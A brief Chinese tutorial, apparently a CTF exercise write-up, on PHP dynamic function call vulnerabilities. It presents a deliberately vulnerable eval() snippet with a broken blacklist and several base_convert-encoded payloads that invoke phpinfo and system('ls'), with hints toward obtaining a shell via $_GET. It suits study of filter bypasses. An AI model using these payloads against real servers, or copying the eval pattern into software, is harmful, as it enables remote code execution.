# php动态函数调用漏洞

## 如何动态调用？
> eg. `$a="phpinfo";$a();`

必须以字符串的方式赋值


我们可以看一个简单的题目

```php
<?php
    $c=$_GET['c'];
    $black_list=['phpinfo'];
    if (preg_match('/'.$black_list.'/',$c)){
        die("hhh");
    }
    eval('echo '.$c.';');
?>
```
>来看几种payload
>> payload0 = `$pi=base_convert(55490343972,10,36);$pi()`
作用的获取phpinfo()，巧在36进制。
>>
>> paylaod1 = `$pi=base_convert(1751504350,10,36);$abs=base_convert(784,10,36);$pi($abs)`
作用是执行`system('ls')`接下来就轮到发挥想象了

还有`hex2bin dechex`等等好用的函数，以及当`$pi="_GET"`时可以通过`$pi[...]`的方式获取==shell==
